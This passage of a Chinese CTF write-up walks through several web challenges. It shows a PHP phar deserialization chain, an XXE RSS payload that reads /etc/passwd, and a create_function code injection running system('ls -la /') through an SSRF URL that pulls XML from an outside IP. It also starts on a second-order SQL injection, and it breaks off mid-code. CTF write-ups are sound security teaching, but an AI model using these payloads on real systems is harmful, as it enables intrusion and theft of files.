</span><span class=c1></span><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>();</span>
<span class=nv>$b</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Profile</span><span class=p>();</span>
<span class=nv>$b</span><span class=o>-&gt;</span><span class=na>admin</span> <span class=o>=</span> <span class=nv>$a</span><span class=p>;</span>
<span class=nv>$o</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>File</span><span class=p>();</span>
<span class=nv>$o</span><span class=o>-&gt;</span><span class=na>checker</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>;</span>
<span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span> <span class=c1>//将自定义的meta-data存入manifest
</span><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span> 
    <span class=c1>//签名自动计算
</span><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><h2 id=rss>rss</h2>
<p>根据题目名字，因为 rss 本身也是个 XML ，这里的考点之一肯定就是 xxe 了。</p>
<p>于是直接拿一个 rss xxe 模版来改一下</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
<span class=cp>&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span>
<span class=cp>&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
<span class=nt>&lt;rss</span> <span class=na>version=</span><span class=s>&#34;2.0&#34;</span> 
    <span class=na>xmlns:atom=</span><span class=s>&#34;http://www.w3.org/2005/Atom&#34;</span><span class=nt>&gt;</span>
    <span class=nt>&lt;channel&gt;</span>
        <span class=nt>&lt;title&gt;</span>先知安全技术社区<span class=nt>&lt;/title&gt;</span>
        <span class=nt>&lt;link&gt;</span>http://xz.aliyun.com/forum/<span class=nt>&lt;/link&gt;</span>
        <span class=nt>&lt;description&gt;</span>先知安全技术社区<span class=nt>&lt;/description&gt;</span>
        <span class=nt>&lt;atom:link</span> <span class=na>href=</span><span class=s>&#34;http://xz.aliyun.com/forum/feed/&#34;</span> <span class=na>rel=</span><span class=s>&#34;self&#34;</span><span class=nt>&gt;&lt;/atom:link&gt;</span>
        <span class=nt>&lt;language&gt;</span>zh-hans<span class=nt>&lt;/language&gt;</span>
        <span class=nt>&lt;lastBuildDate&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class=nt>&lt;/lastBuildDate&gt;</span>
        <span class=nt>&lt;item&gt;</span>
            <span class=nt>&lt;title&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/title&gt;</span>
            <span class=nt>&lt;link&gt;</span>http://xz.aliyun.com/t/6223<span class=nt>&lt;/link&gt;</span>
            <span class=nt>&lt;description&gt;</span>CVE-2018-14418 擦出新火花<span class=nt>&lt;/description&gt;</span>
            <span class=nt>&lt;pubDate&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class=nt>&lt;/pubDate&gt;</span>
            <span class=nt>&lt;guid&gt;</span>http://xz.aliyun.com/t/6223<span class=nt>&lt;/guid&gt;</span>
        <span class=nt>&lt;/item&gt;</span>
    <span class=nt>&lt;/channel&gt;</span>
<span class=nt>&lt;/rss&gt;</span>
</code></pre></div><p>Url_parse 可以按照上面 boring_code 那题使用<code>,</code>来绕过，在自己的端口起个 http 服务，放上面的 xml 文件就行了，类似<code>http://your_vps:80,baidu.com:80/file</code></p>
<p>成功读到<code>/etc/passwd</code>，但是读不到<code>/flag</code>，接着用 php 伪协议读题目源码：</p>
<p>index.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_errors&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_startup_erros&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
<span class=nx>error_reporting</span><span class=p>(</span><span class=k>E_ALL</span><span class=p>);</span>
<span class=k>require_once</span><span class=p>(</span><span class=s1>&#39;routes.php&#39;</span><span class=p>);</span>

<span class=k>function</span> <span class=nf>__autoload</span><span class=p>(</span><span class=nv>$class_name</span><span class=p>){</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s1>&#39;./classes/&#39;</span><span class=o>.</span><span class=nv>$class_name</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>))</span> <span class=p>{</span>

        <span class=k>require_once</span> <span class=s1>&#39;./classes/&#39;</span><span class=o>.</span><span class=nv>$class_name</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>

    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s1>&#39;./controllers/&#39;</span><span class=o>.</span><span class=nv>$class_name</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>))</span> <span class=p>{</span>

        <span class=k>require_once</span> <span class=s1>&#39;./controllers/&#39;</span><span class=o>.</span><span class=nv>$class_name</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>

    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>routes.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=nx>Route</span><span class=o>::</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>,</span><span class=k>function</span><span class=p>(){</span>
    <span class=nx>Index</span><span class=o>::</span><span class=na>createView</span><span class=p>(</span><span class=s1>&#39;Index&#39;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>Route</span><span class=o>::</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>,</span><span class=k>function</span><span class=p>(){</span>
    <span class=nx>Index</span><span class=o>::</span><span class=na>createView</span><span class=p>(</span><span class=s1>&#39;Index&#39;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>Route</span><span class=o>::</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;fetch&#39;</span><span class=p>,</span><span class=k>function</span><span class=p>(){</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;rss_url&#39;</span><span class=p>])){</span>
        <span class=nx>Fetch</span><span class=o>::</span><span class=na>handleUrl</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;rss_url&#39;</span><span class=p>]);</span>
    <span class=p>}</span>
<span class=p>});</span>

<span class=nx>Route</span><span class=o>::</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;rss_in_order&#39;</span><span class=p>,</span><span class=k>function</span><span class=p>(){</span>
    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;rss_url&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;order&#39;</span><span class=p>])){</span>
        <span class=nx>Admin</span><span class=o>::</span><span class=na>createView</span><span class=p>(</span><span class=s1>&#39;Admin&#39;</span><span class=p>);</span>
    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
      <span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;127.0.0.1&#39;</span> <span class=o>||</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;::1&#39;</span><span class=p>){</span>
        <span class=nx>Admin</span><span class=o>::</span><span class=na>sort</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;rss_url&#39;</span><span class=p>],</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;order&#39;</span><span class=p>]);</span>
      <span class=p>}</span><span class=k>else</span><span class=p>{</span>
       <span class=k>echo</span> <span class=s2>&#34;;(&#34;</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
<span class=p>});</span>
</code></pre></div><p>controllers/Admin.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>class</span> <span class=nc>Admin</span> <span class=k>extends</span> <span class=nx>Controller</span><span class=p>{</span>
    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>sort</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span><span class=nv>$order</span><span class=p>){</span>
        <span class=nv>$rss</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
        <span class=nv>$rss</span><span class=o>=</span><span class=nx>simplexml_load_string</span><span class=p>(</span><span class=nv>$rss</span><span class=p>,</span><span class=s1>&#39;SimpleXMLElement&#39;</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span><span class=p>);</span>
        <span class=k>require_once</span> <span class=s1>&#39;./views/Admin.php&#39;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>controllers/Fetch.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>class</span> <span class=nc>Fetch</span> <span class=k>extends</span> <span class=nx>Controller</span><span class=p>{</span>

    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>handleUrl</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$r</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
        <span class=nv>$invalidUrl</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
	<span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/aliyun\.com$/&#39;</span><span class=p>,</span> <span class=nv>$r</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/baidu\.com$/&#39;</span><span class=p>,</span> <span class=nv>$r</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/qq\.com$/&#39;</span><span class=p>,</span> <span class=nv>$r</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>]))</span> <span class=p>{</span> 
            <span class=nv>$rss</span> <span class=o>=</span> <span class=nx>Rss</span><span class=o>::</span><span class=na>fetch</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
        <span class=p>}</span><span class=k>else</span> <span class=p>{</span>
            <span class=nv>$invalidUrl</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>require_once</span> <span class=s1>&#39;./views/Fetch.php&#39;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>Rss.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>class</span> <span class=nc>Rss</span> <span class=p>{</span>

    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>curl_request</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$post</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$cookie</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$headers</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$returnHeader</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$curl</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_USERAGENT</span><span class=p>,</span> <span class=s1>&#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)&#39;</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_FOLLOWLOCATION</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_AUTOREFERER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_REFERER</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$post</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_POST</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_POSTFIELDS</span><span class=p>,</span> <span class=nx>http_build_query</span><span class=p>(</span><span class=nv>$post</span><span class=p>));</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$cookie</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_COOKIE</span><span class=p>,</span> <span class=nv>$cookie</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$headers</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$headers</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_TIMEOUT</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$curl</span><span class=p>,</span> <span class=nx>CURLOPT_RETURNTRANSFER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$curl</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>curl_errno</span><span class=p>(</span><span class=nv>$curl</span><span class=p>))</span> <span class=p>{</span>
            <span class=k>return</span> <span class=nx>curl_error</span><span class=p>(</span><span class=nv>$curl</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=nx>curl_close</span><span class=p>(</span><span class=nv>$curl</span><span class=p>);</span>
        <span class=k>list</span><span class=p>(</span><span class=nv>$header</span><span class=p>,</span> <span class=nv>$body</span><span class=p>)</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
        <span class=nv>$info</span><span class=p>[</span><span class=s1>&#39;header&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$header</span><span class=p>;</span>
        <span class=nv>$info</span><span class=p>[</span><span class=s1>&#39;body&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$body</span><span class=p>;</span>
        <span class=k>return</span> <span class=nv>$info</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>fetch</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span>
        <span class=nv>$rss</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
        <span class=nv>$rss</span><span class=o>=</span><span class=nx>simplexml_load_string</span><span class=p>(</span><span class=nv>$rss</span><span class=p>,</span><span class=s1>&#39;SimpleXMLElement&#39;</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span><span class=p>);</span>
        <span class=k>return</span> <span class=nv>$rss</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>view/Admin.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;;(&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;?php include(&#39;package/header.php&#39;) ?&gt;
</span><span class=err>&lt;?php if(!$rss) {
</span><span class=err>    ?&gt;
</span><span class=err>&lt;div class=&#34;rss-head row&#34;&gt;
</span><span class=err>    &lt;h1&gt;RSS解析失败&lt;/h1&gt;
</span><span class=err>    &lt;ul&gt;
</span><span class=err>        &lt;li&gt;此网站RSS资源可能存在错误无法解析&lt;/li&gt;
</span><span class=err>        &lt;li&gt;此网站RSS资源可能已经关闭&lt;/li&gt;
</span><span class=err>        &lt;li&gt;此网站可能禁止PHP获取此内容&lt;/li&gt;
</span><span class=err>        &lt;li&gt;可能由于来自本站的访问过多导致暂时访问限制Orz&lt;/li&gt;
</span><span class=err>    &lt;/ul&gt;
</span><span class=err>&lt;/div&gt;
</span><span class=err>&lt;?php
</span><span class=err>    exit;
</span><span class=err>};
</span><span class=err>function rss_sort_date($str){
</span><span class=err>    $time=strtotime($str);
</span><span class=err>    return date(&#34;Y年m月d日 H时i分&#34;,$time);
</span><span class=err>}
</span><span class=err>?&gt;
</span><span class=err>&lt;div&gt;
</span><span class=err>&lt;div class=&#34;rss-head row&#34;&gt;
</span><span class=err>    &lt;div class=&#34;col-sm-12 text-center&#34;&gt;
</span><span class=err>        &lt;h1&gt;&lt;a href=&#34;&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;&#34; target=&#34;_blank&#34;&gt;&lt;?php echo $rss-&gt;channel-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt;
</span><span class=err>        &lt;span style=&#34;font-size: 16px;font-style: italic;width:100%;&#34;&gt;&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;&lt;/span&gt;
</span><span class=err>        &lt;p&gt;&lt;?php echo $rss-&gt;channel-&gt;description;?&gt;&lt;/p&gt;
</span><span class=err>        &lt;?php
</span><span class=err>
</span><span class=err>            if(isset($rss-&gt;channel-&gt;lastBuildDate)&amp;&amp;$rss-&gt;channel-&gt;lastBuildDate!=&#34;&#34;){
</span><span class=err>                echo &#34;&lt;p&gt; 最后更新:&#34;.rss_sort_date($rss-&gt;channel-&gt;lastBuildDate).&#34;&lt;/p&gt;&#34;;
</span><span class=err>            }
</span><span class=err>        ?&gt;
</span><span class=err>    &lt;/div&gt;
</span><span class=err>&lt;/div&gt;
</span><span class=err>&lt;div class=&#34;article-list&#34; style=&#34;padding:10px&#34;&gt;
</span><span class=err>    &lt;?php 
</span><span class=err>    $data = [];
</span><span class=err>    foreach($rss-&gt;channel-&gt;item as $item){
</span><span class=err>        $data[] = $item;
</span><span class=err>    }
</span><span class=err>    usort($data, create_function(&#39;$a, $b&#39;, &#39;return strcmp($a-&gt;&#39;.$order.&#39;,$b-&gt;&#39;.$order.&#39;);&#39;));
</span><span class=err>    foreach($data as $item){    
</span><span class=err>    ?&gt;
</span><span class=err>        &lt;article class=&#34;article&#34;&gt;
</span><span class=err>            &lt;h1&gt;&lt;a href=&#34;&lt;?php echo $item-&gt;link;?&gt;&#34; target=&#34;_blank&#34;&gt;&lt;?php echo $item-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt;
</span><span class=err>            &lt;div class=&#34;content&#34;&gt;
</span><span class=err>                &lt;p&gt;
</span><span class=err>                    &lt;?php echo $item-&gt;description;?&gt;
</span><span class=err>                &lt;/p&gt;
</span><span class=err>            &lt;/div&gt;
</span><span class=err>            &lt;div class=&#34;article-info&#34;&gt;
</span><span class=err>                &lt;i style=&#34;margin:0px 5px&#34;&gt;&lt;/i&gt;&lt;?php echo rss_sort_date($item-&gt;pubDate);?&gt;
</span><span class=err>                &lt;i style=&#34;margin:0px 5px&#34;&gt;&lt;/i&gt;
</span><span class=err>                &lt;?php
</span><span class=err>                    for($i=0;$i&lt;count($item-&gt;category);$i++){
</span><span class=err>                        echo $item-&gt;category[$i];
</span><span class=err>                        if($i+1!=count($item-&gt;category)){
</span><span class=err>                            echo &#34;,&#34;;
</span><span class=err>                        }
</span><span class=err>                    };
</span><span class=err>                    if(isset($item-&gt;author)&amp;&amp;$item-&gt;author!=&#34;&#34;){
</span><span class=err>                ?&gt;
</span><span class=err>                        &lt;i class=&#34;fa fa-user&#34; style=&#34;margin:0px 5px&#34;&gt;&lt;/i&gt;
</span><span class=err>                &lt;?php
</span><span class=err>                        echo $item-&gt;author;
</span><span class=err>                    }
</span><span class=err>                ?&gt;
</span><span class=err>            &lt;/div&gt;
</span><span class=err>        &lt;/article&gt;
</span><span class=err>    &lt;?php }?&gt;
</span><span class=err>&lt;/div&gt;
</span><span class=err>&lt;div class=&#34;text-center&#34;&gt;
</span><span class=err>    免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有
</span><span class=err>&lt;/div&gt;
</span><span class=err>&lt;/div&gt;
</span><span class=err>&lt;/div&gt;
</span><span class=err>
</span><span class=err>&lt;?php include(&#39;package/footer.php&#39;) ?&gt;
</span></code></pre></div><p>我们可以在 view/Admin.php 中看到关键点</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>usort</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nx>create_function</span><span class=p>(</span><span class=s1>&#39;$a, $b&#39;</span><span class=p>,</span> <span class=s1>&#39;return strcmp($a-&gt;&#39;</span><span class=o>.</span><span class=nv>$order</span><span class=o>.</span><span class=s1>&#39;,$b-&gt;&#39;</span><span class=o>.</span><span class=nv>$order</span><span class=o>.</span><span class=s1>&#39;);&#39;</span><span class=p>));</span>
</code></pre></div><p>这是个在 FireShell CTF 2019 出过的考点，因为<code>create_function</code>可以进行代码注入，我们可以有以下这种操作</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>id</span><span class=p>,</span><span class=nx>id</span><span class=p>);};</span><span class=k>die</span><span class=p>(</span><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;ls -la /&#39;</span><span class=p>));</span><span class=o>/*</span>
</code></pre></div><p>这样就可以进行命令执行了，所以我们只需要在 xxe 中构造一个 ssrf 绕过 127.0.0.1 的判断就行了</p>
<pre tabindex=0><code>php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&amp;order=id%2Cid)%3B%7D%3Bdie(system('ls%20-la%20%2F'))%3B%2F*
</code></pre><p>在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p>
<h2 id=babyblog>babyblog</h2>
<p>这个题最后没啥时间做了，比较可惜。赛后复盘了一下，仔细看看也没太大的难度，属于还算比较简单的。</p>
<p>扫描可以拿到 www.zip ，拿到源码，进行审计。</p>
<p>在 replace.php 中有经过<code>$row['isvip'] == 1</code>判断才能使用的功能，在 register.php 中有</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$sql</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;insert into users (username,password,isvip) values (&#39;</span><span class=si>$username</span><span class=s2>&#39;, &#39;</span><span class=si>$password</span><span class=s2>&#39;,0);&#34;</span><span class=p>);</span>
</code></pre></div><p>每次注册<code>isvip</code>被设置为 0 的，所以接下来我们需要找个注入点把我们设置为 vip</p>
<p>关键点就在 edit.php 当中：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])){</span>
	<span class=k>foreach</span><span class=p>(</span><span class=nv>$sql</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;select * from article where id=&#34;</span> <span class=o>.</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span> <span class=o>.</span> <span class=s2>&#34;;&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$v</span><span class=p>){</span>
		<span class=nv>$row</span> <span class=o>=</span> <span class=nv>$v</span><span class=p>;</span>
	<span class=p>}</span>
	<span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;userid&#39;</span><span class=p>]){</span>
		<span class=nv>$title</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>]);</span>
		<span class=nv>$content</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]);</span>
		<span class=nv>$sql</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;update article set title=&#39;</span><span class=si>$title</span><span class=s2>&#39;,content=&#39;</span><span class=si>$content</span><span class=s2>&#39; where title=&#39;&#34;</span> <span class=o>.</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&#39;;&#34;</span><span class=p>);</span>
		<span class=k>exit</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;Edited successfully.&#39;);location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;</span><span class=p>);</span>
	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
		<span class=k>exit</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;You do not have permission.&#39;);history.go(-1);&lt;/script&gt;&#34;</span><span class=p>);</span>
	<span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>其中</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$sql</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;update article set title=&#39;</span><span class=si>$title</span><span class=s2>&#39;,content=&#39;</span><span class=si>$content</span><span class=s2>&#39; where title=&#39;&#34;</span> <span class=o>.</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&#39;;&#34;</span><span class=p>);</span>
</code></pre></div><p><code>$row['title']</code>是上面 sql 语句取出来的结果，而<code>title</code>在 writing.php 插入的时候，虽然做了防注入，使用<code>addslashes</code>转义了<code>title</code>的内容</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>])){</span>
